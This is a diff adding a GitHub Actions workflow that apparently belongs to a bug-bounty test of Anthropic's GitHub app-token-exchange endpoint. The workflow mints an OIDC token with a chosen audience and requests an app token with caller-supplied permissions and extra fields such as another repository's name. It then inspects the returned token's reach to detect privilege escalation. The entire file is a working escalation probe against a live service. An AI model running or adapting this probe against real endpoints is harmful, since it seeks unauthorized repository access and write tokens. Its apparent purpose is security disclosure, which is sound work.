@@ -1,0 +1,91 @@
+name: anthropic-oidc-probe
+
+on:
+  workflow_dispatch:
+    inputs:
+      audience:
+        description: 'OIDC audience to request'
+        default: 'claude-code-github-action'
+        required: false
+      extra_body:
+        description: 'Extra JSON body fields (merged with permissions). e.g. {"repository":"foo/bar"}'
+        default: ''
+        required: false
+      permissions_json:
+        description: 'permissions object as JSON, e.g. {"contents":"write"}'
+        default: '{"contents":"read"}'
+        required: false
+
+permissions:
+  id-token: write
+  contents: read
+
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Mint OIDC token
+        id: oidc
+        env:
+          AUD: ${{ github.event.inputs.audience }}
+        run: |
+          # Mint the token with the requested audience
+          URL="${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=${AUD}"
+          RESP=$(curl -sk -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$URL")
+          TOK=$(echo "$RESP" | jq -r .value)
+          if [ -z "$TOK" ] || [ "$TOK" = "null" ]; then
+            echo "OIDC mint failed: $RESP" >&2
+            exit 1
+          fi
+          # Log the decoded payload (signature stays masked)
+          echo "::group::OIDC payload (decoded)"
+          PAYLOAD=$(echo "$TOK" | cut -d. -f2)
+          # padded base64url decode
+          PADLEN=$(( 4 - ${#PAYLOAD} % 4 ))
+          [ $PADLEN -lt 4 ] && PAYLOAD="${PAYLOAD}$(printf '=%.0s' $(seq 1 $PADLEN))"
+          echo "$PAYLOAD" | tr -- '-_' '+/' | base64 -d 2>/dev/null | jq . || echo "decode failed"
+          echo "::endgroup::"
+          echo "::add-mask::$TOK"
+          echo "TOK=$TOK" >> "$GITHUB_OUTPUT"
+
+      - name: Exchange OIDC for app token
+        env:
+          OIDC: ${{ steps.oidc.outputs.TOK }}
+          PERMS: ${{ github.event.inputs.permissions_json }}
+          EXTRA: ${{ github.event.inputs.extra_body }}
+        run: |
+          # Construct body: {"permissions": <PERMS>, ...EXTRA}
+          if [ -n "$EXTRA" ]; then
+            BODY=$(jq -nc --argjson p "$PERMS" --argjson e "$EXTRA" '{permissions:$p} + $e')
+          else
+            BODY=$(jq -nc --argjson p "$PERMS" '{permissions:$p}')
+          fi
+          echo "::group::Request body"
+          echo "$BODY"
+          echo "::endgroup::"
+          HTTP=$(curl -sk -o /tmp/exchange_response.json -w '%{http_code}' \
+            -X POST "https://api.anthropic.com/api/github/github-app-token-exchange" \
+            -H "Authorization: Bearer $OIDC" \
+            -H "Content-Type: application/json" \
+            -H "X-HackerOne-Handle: liamconner10" \
+            -d "$BODY")
+          echo "HTTP $HTTP"
+          # Mask any returned token
+          TOK_OUT=$(jq -r '.token // .app_token // empty' /tmp/exchange_response.json 2>/dev/null || true)
+          if [ -n "$TOK_OUT" ]; then
+            echo "::add-mask::$TOK_OUT"
+          fi
+          echo "::group::Exchange response (token masked)"
+          jq 'if .token then .token = "<MASKED>" elif .app_token then .app_token = "<MASKED>" else . end' /tmp/exchange_response.json 2>/dev/null \
+            || cat /tmp/exchange_response.json
+          echo "::endgroup::"
+          # Inspect what permissions the install token claims (via GitHub API) so we can detect H4 escalation
+          if [ -n "$TOK_OUT" ]; then
+            echo "::group::Install token introspection (GET /installation/repositories)"
+            curl -sk -H "Authorization: Bearer $TOK_OUT" \
+              -H "Accept: application/vnd.github+json" \
+              "https://api.github.com/installation/repositories?per_page=5" \
+              -w '\n--HTTP:%{http_code}\n' | jq '{total_count, repositories:[.repositories[]?|{full_name, private}]}' 2>/dev/null \
+              || echo "introspect failed"
+            echo "::endgroup::"
+          fi
